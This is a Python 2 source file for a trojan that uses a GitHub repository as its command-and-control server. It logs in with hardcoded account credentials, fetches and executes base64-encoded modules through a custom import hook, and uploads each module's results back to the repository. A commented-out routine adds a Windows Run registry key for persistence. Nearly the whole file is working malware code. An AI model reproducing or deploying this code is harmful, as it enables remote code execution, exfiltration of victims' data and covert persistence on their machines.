import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import github3
import os
import win32api
import win32con
import encodings.idna
import _strptime


# autorun
# def autorun():
#     path = os.path.realpath(sys.argv[0])
#     key = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE,
#                               r'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run', 0,
#                               win32con.KEY_ALL_ACCESS)
#     win32api.RegSetValueEx(key, "system_h", 0, win32con.REG_SZ, path)
#     win32api.RegCloseKey(key)
#     return
# autorun()


# trojan
trojan_id = "003-2"
trojan_type = "type2"

trojan_config = "%s.json" % trojan_type
data_path = "data/%s/" % trojan_id
trojan_modules = []

task_queue = Queue.Queue()
configured = False


class GitImporter(object):
    def __init__(self):

        self.current_module_code = ""

    def find_module(self, fullname, path=None):

        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self, name):

        module = imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module

        return module


def connect_to_github():
    gh = github3.login(username="yuqing5610", password="xxaq123")
    repo = gh.repository("yuqing5610", "Trojan")
    branch = repo.branch("master")
    return gh, repo, branch


def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None


def get_trojan_config():
    global configured

    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
    	if task['module'] == 'dirlist':
    		if sys.modules.has_key('dirlist'):
    			del sys.modules['dirlist']
        if task['module'] not in sys.modules:
			exec ("import %s" % task['module'])
        
            #exec("reload (%s)" % task['module'])
    return config


def store_module_result(data):
    gh, repo, branch = connect_to_github()

    for key in data.keys():
        ISOTIMEFORMAT = '%d-%H-%M-%S'
        Time = str(time.strftime(ISOTIMEFORMAT))
        remote_path = "data/%s/%s%s" % (trojan_id, key, Time)
        repo.create_file(remote_path, "Trojan message", data[key])
    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # store the result in our repo
    store_module_result(result)

    return


# main trojan loop
sys.meta_path = [GitImporter()]
while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
        print "[*] connected"

    time.sleep(30)
